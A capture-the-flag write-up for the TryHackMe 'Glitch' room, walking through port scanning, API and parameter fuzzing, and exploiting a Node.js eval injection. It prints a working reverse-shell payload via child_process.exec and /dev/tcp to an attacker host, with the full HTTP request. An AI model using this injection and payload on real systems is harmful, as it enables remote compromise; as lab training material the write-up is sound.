# THM: GLITCH

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/glitch/glitch.jpeg" alt="GLITCH" width="90"/> |
| Room | GLITCH |
| URL | https://tryhackme.com/room/glitch |
| Difficulty | Easy |

## Concepts/Tools Used



## Room Description

Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-23 04:47 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating NSE at 04:47
Completed NSE at 04:47, 0.00s elapsed
Initiating SYN Stealth Scan at 04:47
Scanning target.thm (10.10.231.210) [65535 ports]
Discovered open port 80/tcp on 10.10.231.210
SYN Stealth Scan Timing: About 21.92% done; ETC: 04:50 (0:01:50 remaining)
SYN Stealth Scan Timing: About 57.78% done; ETC: 04:49 (0:00:45 remaining)
Completed SYN Stealth Scan at 04:49, 88.52s elapsed (65535 total ports)
Initiating Service scan at 04:49
Scanning 1 service on target.thm (10.10.231.210)
Completed Service scan at 04:49, 6.03s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.231.210.
Initiating NSE at 04:49
Completed NSE at 04:49, 0.05s elapsed
Initiating NSE at 04:49
Completed NSE at 04:49, 0.01s elapsed
Initiating NSE at 04:49
Completed NSE at 04:49, 0.00s elapsed
Nmap scan report for target.thm (10.10.231.210)
Host is up (0.00054s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 04:49
Completed NSE at 04:49, 0.00s elapsed
Initiating NSE at 04:49
Completed NSE at 04:49, 0.00s elapsed
Initiating NSE at 04:49
Completed NSE at 04:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.25 seconds
           Raw packets sent: 131137 (5.770MB) | Rcvd: 70 (3.076KB)
```

## What is your access token?

I check the html for http://target.thm and I see an interesting script tag near the bottom:

```html
<script>
  function getAccess() {
    fetch('/api/access')
      .then((response) => response.json())
      .then((response) => {
        console.log(response);
      });
  }
</script>
```

Within the browser console I run getAccess() and get the following logged to the console:

```json
{
  "token": "dGhpc19pc19ub3RfcmVhbA=="
}
```

That token value looks like it is base64 encoded so I ran it on the console:

```bash
$ echo 'dGhpc19pc19ub3RfcmVhbA==' | base64 -d
REDACTED
```

That is the access token.

## Getting a Foothold

I tried to find more routes for the API since I now have a token:

```bash
$ gobuster dir -u http://target.thm/api -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/access               (Status: 200) [Size: 36]
/items                (Status: 200) [Size: 169]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

The /api/items route does give a response but it doesn't seem to help much. Since I couldn't find any other routes I tried to find more routes on the site:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/secret               (Status: 200) [Size: 724]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

The /secret page is identical to the homepage. I tried running gobuster on the /secret directory as well but I didn't find any new routes. I have the following routes:

- /
- /secret
- /api/access
- /api/items
- /css
- /js

I am not getting any where with directory enumeration so I try manual verb enumeration on each route. The following was interesting:

```bash
$ curl -X POST http://target.thm/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
```

It looks like this route is the one that I need to test. I have already done directory enumeration on it and I didn't find anything. I fuzz to see if there are any query string parameters:

```bash
$ ffuf -X POST -u http://target.thm/api/items?FUZZ=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\      
       /\ \__/ /\ \__/  __  __  /\ \__/      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\      
          \/_/    \/_/   \/___/    \/_/      

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://target.thm/api/items?FUZZ=1
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

cmd                     [Status: 200, Size: 25, Words: 2, Lines: 1]
:: Progress: [207643/207643] :: Job [1/1] :: 5852 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

This url takes a cmd parameter with the POST verb. I run it with a few variations to see the results:

```bash
$ curl -X POST http://target.thm/api/items?cmd=1
vulnerability_exploited 1
$ curl -X POST http://target.thm/api/items?cmd=2
vulnerability_exploited 2
$ curl -X POST http://target.thm/api/items?cmd=-1
vulnerability_exploited -1
$ curl -X POST http://target.thm/api/items?cmd=a
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: a is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

It looks like it is parsing the cmd value as if it was a javascript expression. From the stacktrace it looks like it is specifically a node parsing issue.

I entered a few arithmetic expressions for the cmd value, they worked as long as I didn't use the plus sign (+). The plus sign is a special character for url encoding, it represents a space. It seems like the plus sign is becoming a space when the expression is evaluated. To prove this, I used `cmd=70+/+7` and it resulted in a value of 10.

At this point I have remote code execution and I need to find a payload to get a reverse shell. I start a listener with the following command:

```bash
$ nc -lnvp 4444
```

This was really frustrating and I tried a number of payloads which did not work. I had to google some ideas for the payload. I found that I can spawn a child process using the following:

```javascript
require("child_process").exec('<my javascript goes here>')
```

This caused me to try a few more things and finally the following payload worked:

```bash
cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/<attack_machine_ip>/4444+0>%261"')
```

The full request was:

```text
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/<attack_machine_ip>/4444+0>%261"') HTTP/1.1
Host: target.thm
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: token=this_is_not_real
Accept-Encoding: gzip, deflate, br
Connection: close
```

I have a shell. I'm in!

## What is the content of user.txt?

I stabilized the shell using the steps [found here](/README.md#stable-shell). Then I checked for the user.txt flag:

```bash
$ whoami
user
cd /home
$ ls
user  v0id
$ cd user/
user@ubuntu:~$ ls
user.txt
$ cat user.txt
REDACTED
```
